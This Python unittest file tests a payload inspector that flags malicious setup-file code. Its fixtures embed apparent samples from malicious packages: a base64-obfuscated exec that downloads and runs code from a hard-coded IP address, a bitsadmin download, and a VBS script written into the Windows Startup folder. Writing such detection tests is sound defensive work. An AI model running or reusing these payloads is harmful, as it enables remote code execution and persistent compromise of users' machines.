from __future__ import annotations

import unittest

from demo.backend.payload_inspector import inspect_payloads


class PayloadInspectorTests(unittest.TestCase):
    def test_decodes_aio3_remote_exec_payload(self) -> None:
        text = (
            "exec(base64.b64decode("
            "'ZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbjsK"
            "ZXhlYyh1cmxvcGVuKCdodHRwOi8vMjAuMTI2LjExOC4yMDgvaW5qZWN0L3gnKS5yZWFkKCkp'"
            "))"
        )

        evidence = inspect_payloads(text, filename="aio3_setup.py")
        joined = " ".join(item["value"] for item in evidence)

        self.assertTrue(any(item["kind"] == "decoded_base64" for item in evidence))
        self.assertIn("20.126.118.208", joined)
        self.assertTrue(any(item["kind"] == "network_indicator" for item in evidence))
        self.assertTrue(any(item["label"] == "urlopen" for item in evidence))

    def test_detects_dfdfdfdfhhh_persistence_and_download_indicators(self) -> None:
        text = (
            "bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "
            '"https://api-hw.com/dl/runtime" '
            '"C:\\Users\\demo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\runtime.zip"\n'
            'open("C:\\Users\\demo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WIN64.vbs", "a")\n'
            "subprocess.run(['pythonw.exe', 'stub.pyw'], shell=True)"
        )

        evidence = inspect_payloads(text, filename="dfdfdfdfhhh_setup.py")
        labels = {item["label"] for item in evidence}

        self.assertIn("bitsadmin", labels)
        self.assertIn("Windows Startup folder", labels)
        self.assertIn("AppData Roaming", labels)
        self.assertIn("pythonw.exe", labels)
        self.assertTrue(any(item["kind"] == "network_indicator" for item in evidence))

    def test_rejects_malformed_and_huge_base64_safely(self) -> None:
        malformed = "exec(base64.b64decode('not valid base64 !!!!'))"
        huge = "exec(base64.b64decode('" + ("A" * 21000) + "'))"

        malformed_evidence = inspect_payloads(malformed)
        huge_evidence = inspect_payloads(huge)

        self.assertFalse(any(item["kind"] == "decoded_base64" for item in malformed_evidence))
        self.assertTrue(any(item["kind"] == "base64_skipped" for item in huge_evidence))


if __name__ == "__main__":
    unittest.main()
